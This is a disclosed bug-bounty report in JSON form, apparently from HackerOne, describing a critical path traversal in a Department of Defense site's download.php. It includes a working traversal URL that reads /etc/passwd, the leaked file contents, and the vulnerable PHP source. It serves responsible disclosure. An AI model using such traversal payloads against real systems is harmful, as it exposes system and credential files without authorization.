{
  "id": 1626210,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI2MjEw",
  "url": "https://hackerone.com/reports/1626210",
  "title": "Local file read at https://████/ [HtUS]",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-07-05T14:02:01.102Z",
  "submitted_at": "2022-07-05T14:02:01.113Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "sudi",
    "url": "/sudi",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/l8v0i0nxdatw6ody2ekdo47w9brl/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%22258823773_412765100530114_8851861083529704363_n.jpg%22%3B%20filename%2A%3DUTF-8%27%27258823773_412765100530114_8851861083529704363_n.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ43X7AVE6%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142753Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDznDy3u4j3aU1sms08KaMsM2p6nJOQrLe%2BCTfeWWCkSwIhAN48aveVhvKijHDcGElNAxLhza0KLS1LZpPsSe93o0ybKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgwvK7%2FEh50UvTXqd%2BwqjwVxALUb2SGRm7B6YVLCblNNJeLEYMP9eIFwrJx2n6mICmSbIypS9B3yAvnt1%2BfS1D83t7Rn1VdVWYB61ugOxItGvtspBCQbXB1pAL3PJp%2B0MLQAKAmma7ose%2F1rTL8LmERwMc3DMPMz1BxbiV5ymD1yhwLenC4zB4Mi8qZbidecDuh5nIlhdqF13XV%2B6KAm8QxD1BYrGzLH5N8f1uIpHfSlVg9b3RaGqG7tXatKEc%2B0kWfbfUKqD9%2B%2FL2XfbnPwDH1S%2BUX%2FyzPVW3JjJKYXhEss2yUFN6Tq9n9CoByuvA%2FYcrxiazMFwRBj5yJetai%2FnnCY8chCHiy9HZQjOkoREByf9TIt%2FSn9%2BVx0bD6%2FffrCjAtZLSC2UpZhTy4nVEe8y1%2FIbu6x2%2FOmY2betwfiloRXuJGAbh7Y0Mzp7IdJoZ6MaFPx2YupBJcGkKwsazmjVgOGT9CCe2KX4O6FLZT%2FF04eYIAqylXx69Q0SJ4J%2Br3RqGHy%2FzI47AhETUW%2Bi4lZLQ0wDIbveIUxwP1kgMxwuVQS6N%2FiLcZe0zSnootH4Lg99WNWg1Po6rwj5rMTmspG8l6UeqsgAslqfH%2FmHKcyFo%2FGR59%2FTJAN00M3F0ALdFU2wmz%2FW16CObf08RwhGO53QGyZZudBb%2BChF%2BpPNPqSngXXSYwU2rO2N8xnjsyOSK66xMWefmZRHPT7taGtLN6EJZMVT1mD6FBLF3ox%2BOYe2XQHl%2FdMCrnAd9QUx63EfvaiCO1DfgwvG0hm%2FZWbTYdIz1nAGAFtW%2FKlljmoQkXVyuC9Qqh%2BXa4VNGPK4dkoFjWqC6MdHke4pQdrA45BsaV1miTY8BuEGuVLO6T6c%2BABWwLNbYlTCqMQboOp5OZ462crMOfdra4GOrABu16tnzpO9sY5jSfF4SRn89CN5OTZwIwBghBLVe9PUEJnt4KrBEP0pTNIIOd3sKPaeVHx4e0zt6lMfhuxqLIxMx6DGzDq96UYpkaP6lrsHHfJx8Ry2vyAV6vtzyL98gbyqNKLq%2FoUPM3Cyq8LSy5CEIjU%2FHaV%2B0M8dW2L8Uj8HH0cWoRL%2FQiBHOoEB8WaQyBZi2Ijbeu6e2CUfWR%2FeGa2O6X3Hq4au7KLmZHgx6sJOqA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bc795704986a2fbda4e1246327f2d15d0a73d133a43bb28cc2d9d22403a13de9"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-10-14T13:51:37.555Z",
  "bug_reporter_agreed_on_going_public_at": "2022-09-22T02:21:59.964Z",
  "team_member_agreed_on_going_public_at": "2022-10-14T13:51:37.374Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Heyy there,\nI have found local file read vulnerability in your website https://█████/\n\nThis the vulnerable endpoint https://██████████/download.php?filePathDownload=data_products and the `filePathDownload` path is vulnerable which allows an attacker to read any local files.\n\nThere was some sort protection when I first checked this endpoint, as it was returning 403 forbidden status code, upon trying something similar as the hacker has shown in report #1542734 . But I was able to bypass the protection in place.\n\n\n---------------------\n\n**Steps to reproduce:**\n\nJust visit this url , which will display the contents of the `/etc/passwd` file:\n\nhttps://████████/download.php?filePathDownload=data_products/../../../../../etc/passwd\n\n\nResponse:\n\n```\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npolkitd:x:999:998:User for polkitd:/:/sbin/nologin\npostfix:x:89:89::/var/spool/postfix:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nchrony:x:998:995::/var/lib/chrony:/sbin/nologin\nec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash\nsaslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin\nmailnull:x:47:47::/var/spool/mqueue:/sbin/nologin\nsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologin\nsssd:x:995:993:User for sssd:/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nntp:x:38:38::/etc/ntp:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\nsustainment:x:1001:1001::/home/sustainment:/bin/bash\nemerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash\ncwagent:x:993:992::/home/cwagent:/bin/bash\nssm-user:x:1003:1004::/home/ssm-user:/bin/bash\napache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\ndrupal:x:1004:1005::/home/drupal:/bin/bash\nsplunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash\nmfe:x:992:1007::/home/mfe:/sbin/nologin\naoc:x:991:991:AWS OTel Collector:/home/aoc:/sbin/nologin\n```\n\n\n\nAlso the content of `/etc/hosts`\n\n```\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n\n████ ███████\n████████\n███████\n███████\n█████████\n██████████\n████████\n\n```\n\n\n\nYou can also read the source code for the available php files such as index.php,download.php\n\nHere's the source code for `download.php`\nhttps://█████/download.php?filePathDownload=data_products/../download.php\n\n```php\n<?php\n\nfunction checkPath($path){\n\n  if(!contains($path, \"data_products\")){\n\n    ob_clean();\n    http_response_code(403);\n\tthrow new RuntimeException('File Not Found Error');  \n    exit();\n    \n  }\n\t\t\n\t\n}\n\nfunction startsWith( $haystack, $needle ) {\n     $length = strlen( $needle );\n     return substr( $haystack, 0, $length ) === $needle;\n}\n\nfunction contains( $haystack, $needle ) {\n     return strpos($haystack, $needle) !== false;\n}\n\nif(isset($_REQUEST[\"file\"]) && isset($_REQUEST['linkpath'])){\n $linkpath=$_REQUEST['linkpath'];\n    echo $file = htmlspecialchars(urldecode(base64_decode($_REQUEST[\"file\"]))); // Decode URL-encoded string\n    echo   $filepath =  $linkpath.'/'.$file;\n    checkPath($filepath);\n    if(is_file($filepath)){\n                    ob_clean();\n                    header(\"Pragma: public\");\n                    header(\"Expires: 0\");\n                    header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");\n                    header(\"Cache-Control: private\",false);\n                   //header('Content-Type: application/pdf');\n                    header('Content-Type: application/octet-stream');\n                    header(\"Content-Disposition: attachment; filename=\\\"\".basename($filepath).\"\\\";\");\n                    header(\"Content-Transfer-Encoding: binary\");\n                    header(\"Content-Length: \".filesize($filepath));\n                    readfile($filepath);\n    }else{\n    echo 'File Not Found ';\n    }\n}\nif(isset($_REQUEST[\"filedownload\"])){\n\n   echo  $filepath = htmlspecialchars(urldecode(base64_decode($_REQUEST[\"filedownload\"]))); // Decode URL-encoded string\n   die;//  $filepath = $_REQUEST[\"filedownload\"];\n   checkPath($filepath);\n    if(is_file($filepath)){\n                    ob_clean();\n                    header(\"Pragma: public\");\n                    header(\"Expires: 0\");\n                    header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");\n                    header(\"Cache-Control: private\",false);\n                    header('Content-Type: application/octet-stream');\n                    header(\"Content-Disposition: attachment; filename=\\\"\".basename($filepath).\"\\\";\");\n                    header(\"Content-Transfer-Encoding: binary\");\n                    header(\"Content-Length: \".filesize($filepath));\n                    readfile($filepath);\n    }else{\n    echo 'File Not Found ';\n    }\n}\n\nif(isset($_REQUEST[\"filePathDownload\"])){\n\n   echo  $filepath = htmlspecialchars(urldecode($_REQUEST[\"filePathDownload\"]));\n    checkPath($filepath);\n     \n    if(is_file($filepath)){\n                    ob_clean();\n                    header(\"Pragma: public\");\n                    header(\"Expires: 0\");\n                    header(\"Cache-Control: must-revalidate, post-check=0, pre-check=0\");\n                    header(\"Cache-Control: private\",false);\n                    header('Content-Type: application/octet-stream');\n                    header(\"Content-Disposition: attachment; filename=\\\"\".basename($filepath).\"\\\";\");\n                    header(\"Content-Transfer-Encoding: binary\");\n                    header(\"Content-Length: \".filesize($filepath));\n                    readfile($filepath);\n    }else{\n    echo 'File Not Found ';\n    }\n}\n\n?>\n```\n\n\n-----------------\n\n## Impact\n\nImpact:\n\nAn attacker can read any local files,I haven't looked much into the local files but as there many users in the system I might be able to get access to something very sensitive.\n\nThankyou\nRegards\nSudhanshu",
  "weakness": {
    "id": 119,
    "name": "Path Traversal: '.../...//'"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 8,
  "voters": [
    "bazzadrox",
    "zy9ard3",
    "pacmanx",
    "shivammusic",
    "sey194",
    "testwlp",
    "dzulqurnain99",
    "draco2166"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
